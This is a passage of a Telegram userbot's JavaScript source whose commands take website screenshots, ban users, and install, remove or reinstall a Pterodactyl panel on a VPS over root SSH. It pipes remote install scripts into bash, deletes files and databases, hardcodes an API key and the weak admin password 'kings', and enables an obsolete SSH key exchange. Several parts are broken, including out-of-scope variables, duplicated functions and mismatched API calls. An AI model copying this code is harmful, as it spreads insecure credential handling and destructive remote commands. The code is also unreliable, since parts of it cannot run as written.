      try { await client.deleteMessages(chatId, [statusMsg.id]); } catch (e) { console.warn("gagal hapus status:", e); }
    }

    if (outPath && fs.existsSync(outPath)) {
      try { fs.unlinkSync(outPath); } catch (e) { console.warn("cannot unlink outPath:", e); }
    }

  } catch (err) {
    console.error("Unhandled error encvar:", err);
    if (typeof statusMsg !== "undefined" && statusMsg && statusMsg.id) {
      try { await client.deleteMessages(chatId, [statusMsg.id]); } catch (_) {}
    }
    try {
      await client.sendMessage(chatId, { message: `<blockquote>❌ <b>ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ: ${err.message || err}</b></blockquote>`, parseMode: "html", replyTo: message.id });
    } catch (_) {}
  }
  break;
}

case "pass":
  await handlerPass(message, client, prefix);
  break;

case "ssweb": {
  (async () => {
    const chatId = message.chatId || message.chat.id;
    try {
      const apiKey = "0d261b";
      const text = (message.message || message.text || "").trim();
      const parts = text.split(/\s+/);
      if (parts.length < 2) {
        return await client.sendMessage(chatId, {
          message: `<blockquote>⚠️ ғᴏʀᴍᴀᴛ: <b>${prefix}ssweb <b>domain</b>\nᴄᴏɴᴛᴏʜ: <b>${prefix}ssweb google.com</b></blockquote>`,
          parseMode: "html",
          replyTo: message.id,
        });
      }

      let targetUrl = parts[1].trim();

      if (!/^https?:\/\//i.test(targetUrl)) {
        targetUrl = "https://" + targetUrl;
      }

     let url;
      try {
        url = new URL(targetUrl);
      } catch (e) {
        return await client.sendMessage(chatId, {
          message: "<blockquote>❌ URL ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ. ᴘᴀsᴛɪᴋᴀɴ ᴋᴀᴍᴜ ᴍᴇᴍᴀsᴜᴋᴋᴀɴ ᴅᴏᴍᴀɪɴ ᴀᴛᴀᴜ URL ʏᴀɴɢ ʙᴇɴᴀʀ...</blockquote>",
          parseMode: "html",
          replyTo: message.id,
        });
      }

      const statusMsg = await client.sendMessage(chatId, {
        message: `<blockquote>🚀 ᴍᴇɴɢᴀᴍʙɪʟ sᴄʀᴇᴇɴsʜᴏᴛ:\n<code>${url.href}</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });

      const outPath = path.join(__dirname, `ssweb_${Date.now()}.png`);

      const apiUrl = `https://api.screenshotmachine.com/?key=${apiKey}&url=${encodeURIComponent(url.href)}&dimension=1366xfull&format=png&cacheLimit=0`;

      const response = await axios.get(apiUrl, { responseType: "arraybuffer", timeout: 30000 });
      fs.writeFileSync(outPath, response.data);
      
      await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }).catch(() => {});

      await client.sendMessage(chatId, {
        file: outPath,
        caption: `<blockquote><b>sᴄʀᴇᴇsʜᴏᴛ</b>\n<code>${url.href}</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });

      try { if (statusMsg?.id) await client.deleteMessages(chatId, [statusMsg.id]); } catch (_) {}
      try { if (fs.existsSync(outPath)) fs.unlinkSync(outPath); } catch (_) {}

    } catch (err) {
      console.error(`${prefix}ssweb error:`, err);
      const msg = String(err && err.message ? err.message : err);
      await client.deleteMessages(chatId, [statusMsg.id], { revoke: true }).catch(() => {});
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ sᴄʀᴇᴇɴsʜᴏᴛ: ${escapeHtml(msg)}</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      }).catch(()=>{});
    }
  })();
  break;
}

function escapeHtml(s = "") {
  return s.replace(/&/g, "&amp;")
          .replace(/</g, "&lt;")
          .replace(/>/g, "&gt;")
          .replace(/"/g, "&quot;");
}

case "installpanel": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat.id;

      const args = message.text.split(" ").slice(1).join(" ");
      const t = args.split(",").map(x => x.trim());
      if (t.length < 5) {
        return client.sendMessage(chatId, {
          message: `<blockquote>❌ <b>Format salah!</b>\n\n<b>Format:</b> <code>${prefix}installpanel ip_vps,password_vps,domain_panel,domain_node,ram_vps</code>\n\n<b>Contoh:</b> <code>${prefix}installpanel 1.2.3.4,PasswordVps,panel.domain.com,node.domain.com,16000000</code></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const [ipvps, passwd, subdomain, domainnode, ramvps] = t;

      if (!ipvps || !passwd || !subdomain || !domainnode || !ramvps) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ Semua field harus diisi!</blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      const { Client } = require("ssh2");
      const conn = new Client();

      const connSettings = {
        host: ipvps,
        port: 22,
        username: "root",
        password: passwd,
        readyTimeout: 20000,
        algorithms: {
          kex: [
            'diffie-hellman-group1-sha1',
            'ecdh-sha2-nistp256',
            'ecdh-sha2-nistp384',
            'ecdh-sha2-nistp521',
            'diffie-hellman-group-exchange-sha256',
            'diffie-hellman-group14-sha1'
          ]
        }
      };

      const user = "yakuza" + generateReadableString(4);
      const pass = "yakuza" + generateReadableString(4);
      const timezone = "Asia/Jakarta";

      const sentMessage = await client.sendMessage(chatId, {
        message: `<blockquote>🚀 <b>Memulai pemasangan Pterodactyl Panel!</b>

🖥️ <b>IP VPS:</b> <code>${ipvps}</code>
🌐 <b>Panel Domain:</b> <code>${subdomain}</code>
🛰️ <b>Node Domain:</b> <code>${domainnode}</code>
💾 <b>RAM VPS:</b> <code>${parseInt(ramvps).toLocaleString()} MB</code>
⏰ <b>Timezone:</b> <code>${timezone}</code>

⏳ <i>Proses mungkin memakan waktu 10-20 menit...</i></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      const editReply = async (client, messageId, text) => {
        try {
          await client.editMessageText({
            chat_id: chatId,
            message_id: messageId,
            text: text,
            parse_mode: "html"
          });
        } catch (error) {
          console.error("Error editing message:", error);
        }
      };

      await new Promise((resolve, reject) => {
        conn.on("ready", resolve);
        conn.on("error", reject);
        conn.connect(connSettings);
      });

      console.log("SSH Connected to", ipvps);
      
      const finalMessage = await installPanel(
        conn, 
        client, 
        chatId, 
        {
          vpsIP: ipvps,
          vpsPassword: passwd,
          domainpanel: subdomain,
          domainnode: domainnode,
          ramserver: ramvps,
          user: user,
          pass: pass,
          prefix: prefix,
          editReply: editReply,
          sentMessage: sentMessage
        }
      );

      await client.sendMessage(chatId, {
        message: finalMessage,
        parseMode: "html"
      });

      conn.end();

    } catch (error) {
      console.error("Error installpanel:", error);
      
      if (error.message.includes("All configured authentication methods failed")) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>Password SSH salah!</b>\nPastikan password VPS benar</blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      } else if (error.message.includes("ECONNREFUSED")) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>Port 22 tertutup atau VPS mati!</b>\nPastikan VPS aktif dan port 22 terbuka</blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      } else if (error.message.includes("ETIMEDOUT")) {
        await client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>Timeout koneksi!</b>\nVPS tidak merespons, cek koneksi internet</blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      } else {
        await client.sendMessage(chatId, {
          message: `<blockquote>❌ <b>Terjadi error:</b>\n<code>${error.message}</code></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }
    }
  })();
  break;
}

async function installPanel(ssh, client, chatId, params) {
  const { vpsIP, domainpanel, domainnode, ramserver, user, pass, prefix, editReply, sentMessage } = params;
  
  const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`;
  const commandCreateNode = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/main/createnode.sh)`;

  try {
    if (!domainpanel || !domainnode || !ramserver) {
      throw new Error("Format: /installpanel ipvps|pwvps|panel.com|node.com|ramserver");
    }

    await editReply(client, sentMessage.message_id, `<blockquote>🔄 <b>Menginstal Panel..(tunggu 5 menit).</b>\nIP: ${vpsIP} | Domain: ${domainpanel}</blockquote>`);

    await new Promise((resolve, reject) => {
      ssh.exec(commandPanel, (err, stream) => {
        if (err) return reject(err);
        stream.on('close', resolve);
        stream.on('data', (data) => {
          console.log("Panel Logger:", data.toString());
          const output = data.toString();
          
          if (output.includes('Input 0-6')) stream.write('0\n');
          else if (output.includes('Database name (panel)')) stream.write('\n');
          else if (output.includes('Database username (pterodactyl)')) stream.write('\n');
          else if (output.includes('Password (press enter to use randomly generated password)')) stream.write('\n');
          else if (output.includes('Select timezone')) {
            stream.write('Asia/Jakarta\n');
            stream.write('yakuza@gmail.com\n');
            stream.write('yakuza@gmail.com\n');
            stream.write(`${user}\n`);
            stream.write('yakuza\n');
            stream.write('yakuza\n');
            stream.write(`${pass}\n`);
            stream.write(`${domainpanel}\n`);
          }
          else if (output.includes('(y/N)') || output.includes('(yes/no)') || output.includes('(A)gree/(C)ancel')) {
            stream.write('y\n');
          }
          else if (output.includes('Set the FQDN of this panel')) {
            stream.write(`${domainpanel}\n`);
          }
        });
        stream.stderr.on('data', (data) => console.error("Panel STDERR:", data.toString()));
      });
    });

    await editReply(client, sentMessage.message_id, `<blockquote>✅ Panel berhasil diinstall! Melanjutkan instalasi Wings...</blockquote>`);

    await new Promise((resolve, reject) => {
      ssh.exec(commandPanel, (err, stream) => {
        if (err) return reject(err);
        stream.on('close', resolve);
        stream.on('data', (data) => {
          console.log("Wings Logger:", data.toString());
          const output = data.toString();
          
          if (output.includes('Input 0-6')) stream.write('1\n');
          else if (output.includes('Enter the panel address')) stream.write(`${domainpanel}\n`);
          else if (output.includes('Database host username')) stream.write(`${user}\n`);
          else if (output.includes('Database host password')) stream.write(`${pass}\n`);
          else if (output.includes('Set the FQDN to use for Let\'s Encrypt')) stream.write(`${domainnode}\n`);
          else if (output.includes('Enter email address')) stream.write('syah@gmail.com\n');
          else if (output.includes('(y/N)')) stream.write('y\n');
        });
        stream.stderr.on('data', (data) => console.error("Wings STDERR:", data.toString()));
      });
    });

    await editReply(client, sentMessage.message_id, `<blockquote>✅ Wings berhasil diinstall! Melanjutkan Create Node...</blockquote>`);

    await new Promise((resolve, reject) => {
      ssh.exec(commandCreateNode, (err, streamNode) => {
        if (err) return reject(err);
        streamNode.on('close', resolve);
        streamNode.on('data', (data) => {
          console.log("CreateNode Logger:", data.toString());
          const output = data.toString();
          
          if (output.includes("Masukkan nama lokasi: ")) streamNode.write('SGP\n');
          else if (output.includes("Masukkan deskripsi lokasi: ")) streamNode.write('Jhonaley Tech\n');
          else if (output.includes("Masukkan domain: ")) streamNode.write(`${domainnode}\n`);
          else if (output.includes("Masukkan nama node: ")) streamNode.write('NODE BY YAKUZA\n');
          else if (output.includes("Masukkan RAM (dalam MB): ")) streamNode.write(`${ramserver}\n`);
          else if (output.includes("Masukkan jumlah maksimum disk space (dalam MB): ")) streamNode.write(`${ramserver}\n`);
          else if (output.includes("Masukkan Locid: ")) streamNode.write('1\n');
        });
        streamNode.stderr.on('data', (data) => console.error("CreateNode STDERR:", data.toString()));
      });
    });

    const finalMessage = `<blockquote>✅ <b>Instalasi Panel dan Node berhasil!</b>
<b>Berikut Detail Akun Admin Panel:</b>
👤 <b>Username :</b> <code>${user}</code>
🔑 <b>Password :</b> <code>${pass}</code>
🌐 <b>Domain Panel:</b> ${domainpanel}
🛰 <b>Domain Node:</b> ${domainnode}

📋 Note : Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Dibuat Oleh Bot Untuk Menjalankan Wings.
🚀 Cara Menjalankan Wings: ketik <code>${prefix}startwings ${vpsIP},${passwd},tokenwings</code></blockquote>`;

    return finalMessage;

  } catch (error) {
    console.error('❌ Install Panel Error:', error);
    throw error;
  }
}

function generateReadableString(length) {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

case "uninstallpanel": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat.id;
      const args = message.text.split(" ").slice(1).join(" ");
      const t = args.split(",").map(x => x.trim());

      if (t.length < 2) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> ${prefix}uninstallpanel ip_vps,password_vps\n\n<b>Contoh:</b> ${prefix}uninstallpanel 1.2.3.4,PasswordVps</blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const [ipvps, passwd] = t;

      const { Client } = require("ssh2");
      const conn = new Client();

      const connSettings = {
        host: ipvps,
        port: 22,
        username: "root",
        password: passwd,
      };

      const uninstallCommand = `
echo "🚀 Sedang menghapus Pterodactyl dan Wings...";
systemctl stop wings || true;
systemctl disable wings || true;
systemctl stop nginx mariadb redis || true;
systemctl disable nginx mariadb redis || true;
rm -rf /var/www/pterodactyl /etc/pterodactyl /var/lib/pterodactyl /etc/systemd/system/wings.service /usr/local/bin/wings /root/pterodactyl-installer.sh;
mysql -u root -e "DROP DATABASE IF EXISTS panel;";
apt remove -y nginx mariadb-server redis-server php*;
apt autoremove -y;
apt clean;
echo "✅ Uninstall Pterodactyl & Wings berhasil dihapus sepenuhnya.";
`;

      await client.sendMessage(chatId, {
        message: `<blockquote>🚀 <b>ᴘʀᴏɢʀᴇss ᴜɴɪɴsᴛᴀʟʟ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ᴅɪᴍᴜʟᴀɪ...</b>\n\n🖥️ <b>ɪᴘ</b> : <code>${ipvps}</code>\n\n⏳ ᴍᴏʜᴏɴ ᴛᴜɴɢɢᴜ ʙᴇʙᴇʀᴀᴘᴀ ᴍᴇɴɪᴛ...</blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      conn.on("ready", () => {
        client.sendMessage(chatId, {
          message: "<blockquote>🚀 <b>ʙᴇʀʜᴀsɪʟ ᴛᴇʀʜᴜʙᴜɴɢ ᴋᴇ VPS, ᴍᴜʟᴀɪ ᴘʀᴏsᴇs ᴜɴɪɴsᴛᴀʟʟ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ...</b></blockquote>",
          parseMode: "html"
        });

        conn.exec(uninstallCommand, { pty: true }, (err, stream) => {
          if (err) {
            client.sendMessage(chatId, {
              message: "<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴᴊᴀʟᴀɴᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ᴜɴɪɴsᴛᴀʟʟ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ</blockquote>",
              parseMode: "html"
            });
            conn.end();
            return;
          }

          let output = "";

          stream.on("data", (data) => {
            output += data.toString();
            console.log("[UNINSTALL LOG]", data.toString());
          });

          stream.stderr.on("data", (data) => {
            console.error("[UNINSTALL ERR]", data.toString());
          });

          stream.on("close", (code) => {
            conn.end();
            if (code === 0) {
              client.sendMessage(chatId, {
                message: `<blockquote>✅ <b>ʙᴇʀʜᴀsɪʟ ᴜɴɪɴsᴛᴀʟʟ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ!</b>\n\nᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ & ᴡɪɴɢs ᴛᴇʟᴀʜ ᴅɪʜᴀᴘᴜs sᴇᴘᴇɴᴜʜɴʏᴀ ᴅᴀʀɪ VPS <code>${ipvps}</code></blockquote>`,
                parseMode: "html"
              });
            } else {
              client.sendMessage(chatId, {
                message: `<blockquote>⚠️ ᴜɴɪɴsᴛᴀʟʟ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ sᴇʟᴇsᴀɪ ᴅᴇɴɢᴀɴ ᴋᴏᴅᴇ ᴋᴇʟᴜᴀʀ <b>${code}</b>. sᴇʙᴀɢɪᴀɴ ᴍᴜɴɢᴋɪɴ ᴍᴀsɪʜ ᴛᴇʀsɪsᴀ</blockquote>`,
                parseMode: "html"
              });
            }
          });
        });
      })
      .on("error", (err) => {
        if (err.message.includes("All configured authentication methods failed")) {
          client.sendMessage(chatId, { message: "<blockquote>❌ ᴘᴀssᴡᴏʀᴅ VPS sᴀʟᴀʜ ᴀᴛᴀᴜ ᴀᴋsᴇs SSH ᴅɪᴛᴏʟᴀᴋ</blockquote>", parseMode: "html" });
        } else if (err.message.includes("ECONNREFUSED")) {
          client.sendMessage(chatId, { message: "<blockquote>❌ ᴘᴏʀᴛ 22 VPS ᴛɪᴅᴀᴋ ᴛᴇʀʙᴜᴋᴀ ᴀᴛᴀᴜ VPS ᴍᴀᴛɪ</blockquote>", parseMode: "html" });
        } else if (err.message.includes("ETIMEDOUT")) {
          client.sendMessage(chatId, { message: "<blockquote>❌ VPS ᴛɪᴅᴀᴋ ᴍᴇʀᴇsᴘᴏɴ ᴀᴛᴀᴜ ᴛɪᴍᴇᴏᴜᴛ</blockquote>", parseMode: "html" });
        } else {
          client.sendMessage(chatId, { message: `<blockquote>❌ SSH ᴇʀʀᴏʀ: ${err.message}</blockquote>`, parseMode: "html" });
        }
      })
      .connect(connSettings);

    } catch (e) {
      console.error("Error uninstallpanel:", e);
      client.sendMessage(chatId, { message: `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴇʀʀᴏʀ: ${e.message}</blockquote>`, parseMode: "html", replyTo: message.id });
    }
  })();
  break;
}

case "reinstallpanel": {
  (async () => {
    try {
      const chatId = message.chatId || message.chat.id;
      const args = message.text.split(" ").slice(1).join(" ");
      const t = args.split(",").map(x => x.trim());

      if (t.length < 5) {
        return client.sendMessage(chatId, {
          message: `<blockquote>⚠️ <b>ғᴏʀᴍᴀᴛ:</b> <code>${prefix}reinstallpanel ip_vps,password_vps,subdomain_panel,domain_node,ram_vps</code>\n\n<b>ᴄᴏɴᴛᴏʜ:</b> <code>${prefix}reinstallpanel 1.2.3.4,PasswordVps,panel.domain.com,node.domain.com,16000000</code></blockquote>`,
          parseMode: "html",
          replyTo: message.id
        });
      }

      const [ipvps, passwd, subdomain, domainnode, ramvps] = t;

      if (!ipvps || !passwd || !subdomain || !domainnode || !ramvps) {
        return client.sendMessage(chatId, {
          message: "<blockquote>❌ sᴇᴍᴜᴀ ғɪᴇʟᴅ ʜᴀʀᴜs ᴅɪɪsɪ!</blockquote>",
          parseMode: "html",
          replyTo: message.id
        });
      }

      const { Client } = require("ssh2");
      const conn = new Client();

      const connSettings = {
        host: ipvps,
        port: 22,
        username: "root",
        password: passwd,
        readyTimeout: 20000,
        algorithms: {
          kex: [
            'diffie-hellman-group1-sha1',
            'ecdh-sha2-nistp256',
            'ecdh-sha2-nistp384',
            'ecdh-sha2-nistp521',
            'diffie-hellman-group-exchange-sha256',
            'diffie-hellman-group14-sha1'
          ]
        }
      };

      const email = "kings@gmail.com";
      const username = "kings";
      const password = "kings";

      const startMsg = await client.sendMessage(chatId, {
        message: `<blockquote>♻️ <b>ᴍᴇᴍᴜʟᴀɪ ʀᴇɪɴsᴛᴀʟʟ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ</b>\n\n🖥️ <b>ɪᴘ ᴠᴘs:</b> <code>${ipvps}</code>\n🌐 <b>ᴘᴀɴᴇʟ ᴅᴏᴍᴀɪɴ:</b> <code>${subdomain}</code>\n🛰️ <b>ɴᴏᴅᴇ ᴅᴏᴍᴀɪɴ:</b> <code>${domainnode}</code>\n💾 <b>ʀᴀᴍ ᴠᴘs:</b> <code>${parseInt(ramvps).toLocaleString()} MB</code>\n\n⏳ <i>ᴘʀᴏɢʀᴇss ᴍᴜɴɢᴋɪɴ ᴍᴇᴍᴀᴋᴀɴ ᴡᴀᴋᴛᴜ 15-25 ᴍᴇɴɪᴛ...</i></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });

      let currentStep = 0;
      const totalSteps = 4;

      function updateProgress(step, message) {
        currentStep = step;
        const percentage = Math.round((step / totalSteps) * 100);
        const progressBar = "█".repeat(Math.round(percentage / 25)) + "░".repeat(4 - Math.round(percentage / 25));
        
        client.sendMessage(chatId, {
          message: `<blockquote>♻️ <b>Reinstall Pterodactyl Panel</b>\n\n${message}\n\n⌛️ <b>Progress:</b> ${step}/${totalSteps} (${percentage}%)\n${progressBar}</blockquote>`,
          parseMode: "html"
        }).catch(console.error);
      }

      conn.on("ready", () => {
        console.log("SSH Connected to", ipvps);
        updateProgress(1, "✅ <b>Koneksi SSH berhasil!</b>\n\n🧹 <b>Step 1/4:</b> Menghapus instalasi lama...");

        const uninstallCommands = [
          "systemctl stop wings nginx mariadb redis-server php8.1-fpm php8.2-fpm || true",
          "systemctl disable wings nginx mariadb redis-server php8.1-fpm php8.2-fpm || true",
          "pkill -f pterodactyl || pkill -f wings || true",
          "rm -rf /var/www/pterodactyl /etc/pterodactyl /var/lib/pterodactyl /usr/local/bin/wings",
          "rm -rf /etc/nginx/sites-*/pterodactyl.conf /etc/systemd/system/wings.service",
          "rm -rf /root/pterodactyl-installer.sh /root/wings-installer.sh",
          "mysql -u root -e 'DROP DATABASE IF EXISTS panel;' 2>/dev/null || true",
          "mysql -u root -e 'DROP USER IF EXISTS \\'pterodactyl\\'@\\'127.0.0.1\\';' 2>/dev/null || true",
          "apt remove --purge -y nginx mariadb-server redis-server php*",
          "apt autoremove -y && apt clean",
          "echo '✅ Uninstall selesai'"
        ];

        let uninstallIndex = 0;

        function runUninstallCommand() {
          if (uninstallIndex >= uninstallCommands.length) {
            updateProgress(2, "✅ <b>Uninstall selesai!</b>\n\n🚀 <b>Step 2/4:</b> Memulai instalasi Pterodactyl Panel baru...");
            installPanel();
            return;
          }

          const cmd = uninstallCommands[uninstallIndex];
          console.log(`Uninstall command ${uninstallIndex + 1}:`, cmd);

          conn.exec(cmd, (err, stream) => {
            if (err) {
              console.warn(`Uninstall command ${uninstallIndex + 1} failed:`, err.message);
              uninstallIndex++;
              setTimeout(runUninstallCommand, 1000);
              return;
            }

            stream.on('close', () => {
              uninstallIndex++;
              setTimeout(runUninstallCommand, 1000);
            });

            stream.stderr.on('data', (data) => {
              console.warn(`Uninstall stderr ${uninstallIndex + 1}:`, data.toString());
            });
          });
        }

        runUninstallCommand();
      });

      function installPanel() {
        const panelCommand = `curl -sSL https://get.pterodactyl-installer.se | sudo bash -s -- --email ${email} --panel-url https://${subdomain} --admin-user ${username} --admin-password ${password} --allow-unstable`;

        conn.exec(panelCommand, { pty: true }, (err, stream) => {
          if (err) {
            sendFail("Gagal menjalankan instalasi panel", err);
            return;
          }

          let panelOutput = "";
          
          stream.on("close", (code, signal) => {
            console.log("Panel install closed:", code, signal);
            if (code === 0) {
              updateProgress(3, "✅ <b>Panel berhasil diinstall!</b>\n\n🚀 <b>Step 3/4:</b> Memulai instalasi Wings...");
              installWings();
            } else {
              sendFail(`Install panel gagal (exit code ${code})`);
            }
          });

          stream.on("data", (data) => {
            const str = data.toString();
            panelOutput += str;
            console.log("PANEL:", str);
            
            if (str.includes("Do you want to continue?") || str.includes("(Y)es/(N)o")) {
              stream.write("yes\n");
            }
            if (str.includes("Press ENTER to continue")) {
              stream.write("\n");
            }
            if (str.includes("email address") || str.includes("Email:")) {
              stream.write(email + "\n");
            }
            if (str.includes("username") || str.includes("Username:")) {
              stream.write(username + "\n");
            }
            if (str.includes("First name") || str.includes("First Name:")) {
              stream.write("Kings\n");
            }
            if (str.includes("Last name") || str.includes("Last Name:")) {
              stream.write("Bot\n");
            }
            if (str.includes("password") || str.includes("Password:")) {
              stream.write(password + "\n");
            }
            if (str.includes("hostname") || str.includes("Panel URL")) {
              stream.write(`https://${subdomain}\n`);
            }
            if (str.includes("Timezone")) {
              stream.write("Asia/Jakarta\n");
            }
          });

          stream.stderr.on("data", (data) => {
            console.log("PANEL STDERR:", data.toString());
          });
        });
      }

      function installWings() {
        const wingsCommand = `curl -sSL https://get.pterodactyl-installer.se | sudo bash -s -- --wings --panel-url https://${subdomain} --token --allow-unstable`;

        conn.exec(wingsCommand, { pty: true }, (err, stream) => {
          if (err) {
            sendFail("Gagal menjalankan instalasi wings", err);
            return;
          }

          let wingsOutput = "";
          
          stream.on("close", (code, signal) => {
            console.log("Wings install closed:", code, signal);
            if (code === 0) {
              updateProgress(4, "✅ <b>Wings berhasil diinstall!</b>\n\n⚙️ <b>Step 4/4:</b> Setup service dan konfigurasi...");
              setupServices();
            } else {
              sendFail(`Install wings gagal (exit code ${code})`);
            }
          });

          stream.on("data", (data) => {
            const str = data.toString();
            wingsOutput += str;
            console.log("WINGS:", str);
            
            if (str.includes("Continue?") || str.includes("(Y)es/(N)o")) {
              stream.write("yes\n");
            }
            if (str.includes("Press ENTER")) {
              stream.write("\n");
            }
          });

          stream.stderr.on("data", (data) => {
            console.log("WINGS STDERR:", data.toString());
          });
        });
      }

      function setupServices() {
        const setupCommands = [
          "systemctl enable wings",
          "systemctl start wings",
          "systemctl enable nginx",
          "systemctl start nginx",
          "systemctl enable mariadb",
          "systemctl start mariadb",
          "systemctl enable redis-server",
          "systemctl start redis-server",
          "ufw allow 8080",
          "ufw allow 2022",
          "ufw allow 80",
          "ufw allow 443",
          "echo '✅ Services configured'"
        ];

        let setupIndex = 0;
        
        function runSetupCommand() {
          if (setupIndex >= setupCommands.length) {
            sendDone();
            return;
          }

          const cmd = setupCommands[setupIndex];
          console.log(`Setup command ${setupIndex + 1}:`, cmd);

          conn.exec(cmd, (err, stream) => {
            if (err) {
              console.warn(`Setup command ${setupIndex + 1} failed:`, err.message);
              setupIndex++;
              setTimeout(runSetupCommand, 1000);
              return;
            }

            stream.on('close', () => {
              setupIndex++;
              setTimeout(runSetupCommand, 1000);
            });
          });
        }

        runSetupCommand();
      }

      function sendFail(msg, err = null) {
        console.error("[ERROR]", msg, err);
        conn.end();
        client.sendMessage(chatId, {
          message: `<blockquote>❌ <b>Reinstall gagal!</b>\n\nError: ${msg}${err ? `\n\n<code>${err.message}</code>` : ''}</blockquote>`,
          parseMode: "html"
        });
      }

      function sendDone() {
        const finalMessage = `<blockquote>━━━━━━━━━━━━━━━━━━━━━━━━
<b>✅ REINSTALL PTERODACTYL SELESAI</b>
━━━━━━━━━━━━━━━━━━━━━━━━

<b>🌐 PANEL URL:</b>
https://${subdomain}

<b>🔧 LOGIN DETAILS:</b>
👤 Username: <code>${username}</code>
🔑 Password: <code>${password}</code>
📧 Email: <code>${email}</code>

<b>🛰️ NODE CONFIG:</b>
🌐 FQDN: <code>${domainnode}</code>
💾 RAM: <code>${parseInt(ramvps).toLocaleString()} MB</code>
🔧 Port Range: <code>2000-2300</code>

<b>📋 NEXT STEPS:</b>
1. Login ke panel: https://${subdomain}
2. Buat location & node
3. Generate node token
4. Jalankan: <code>${prefix}wings ${ipvps},${passwd},token_node</code>

<b>⏰ NOTE:</b>
Panel mungkin butuh 5-10 menit untuk fully active
━━━━━━━━━━━━━━━━━━━━━━━━
© ʙʏ ʏᴀᴋᴜᴢᴀ 👑</blockquote>`;

        client.sendMessage(chatId, {
          message: finalMessage,
          parseMode: "html"
        });
        
        conn.end();
      }

      conn.on("error", (err) => {
        console.error("SSH Error:", err);
        let errorMsg = "❌ Gagal terhubung ke VPS!";
        
        if (err.message.includes("All configured authentication methods failed")) {
          errorMsg = "❌ <b>Password SSH salah!</b>\nPastikan password VPS benar.";
        } else if (err.message.includes("ECONNREFUSED")) {
          errorMsg = "❌ <b>Port 22 tertutup atau VPS mati!</b>\nPastikan VPS aktif dan port 22 terbuka.";
        } else if (err.message.includes("ETIMEDOUT")) {
          errorMsg = "❌ <b>Timeout koneksi!</b>\nVPS tidak merespons, cek koneksi internet.";
        }
        
        client.sendMessage(chatId, {
          message: `<blockquote>${errorMsg}</blockquote>`,
          parseMode: "html"
        });
      });

      conn.on("timeout", () => {
        client.sendMessage(chatId, {
          message: "<blockquote>❌ <b>Koneksi timeout!</b>\nCoba lagi beberapa saat.</blockquote>",
          parseMode: "html"
        });
      });

      conn.connect(connSettings);

    } catch (e) {
      console.error("Error reinstallpanel:", e);
      await client.sendMessage(chatId, {
        message: `<blockquote>❌ <b>Terjadi error:</b>\n<code>${e.message}</code></blockquote>`,
        parseMode: "html",
        replyTo: message.id
      });
    }
  })();
  break;
}

function parseDuration(str) {
  if (!str) return null;
  const match = str.match(/^(\d+)([smhd])$/);
  if (!match) return null;
  const val = parseInt(match[1]);
  const unit = match[2];
  const map = { s: 1, m: 60, h: 3600, d: 86400 };
  return val * map[unit];
}

async function getTargetUser(client, message, args) {
  try {
    const replyMsg = await message.getReplyMessage?.();
    if (replyMsg && replyMsg.senderId) {
      return await client.getEntity(replyMsg.senderId);
    }

    if (args && args.length > 0) {
      const mention = args[0];
      if (/^@\w+/.test(mention)) {
        return await client.getEntity(mention);
      } else if (/^\d+$/.test(mention)) {
        return await client.getEntity(Number(mention));
      }
    }

    return null;
  } catch {
    return null;
  }
}

case "ban": {
    const target = await getTargetUser(client, message, args);
    if (!target) {
      return client.sendMessage(message.chatId, {
        message:
          "<blockquote>⚠️ ʀᴇᴘʟʏ ᴘᴇsᴀɴ ᴀᴛᴀᴜ ᴛᴀɢ</blockquote>",
        parseMode: "html",
        replyTo: message.id,
      });
    }

    try {
      await client.invoke(
        new Api.channels.EditBanned({
          channel: message.chatId,
          participant: target.id,
          bannedRights: new Api.ChatBannedRights({
            viewMessages: true,
          }),
        })
      );

      await client.sendMessage(message.chatId, {
        message: `<blockquote><b>${target.username ? "@" + target.username : target.firstName}</b> ᴍᴀᴍᴘᴜs ᴋᴏɴᴛᴏʟ ᴅɪʙᴀɴ 😹</blockquote>`,
        parseMode: "html",
      });
    } catch (e) {
      await client.sendMessage(message.chatId, {
        message: `<blockquote>⚠️ ɢᴀɢᴀʟ ʙᴀɴ ᴜsᴇʀ: ${e.errorMessage || e.message}</blockquote>`,
        parseMode: "html",
        replyTo: message.id,
      });
    }
    break;
  }

  case "unban": {
    const target = await getTargetUser(client, message, args);
    if (!target) {
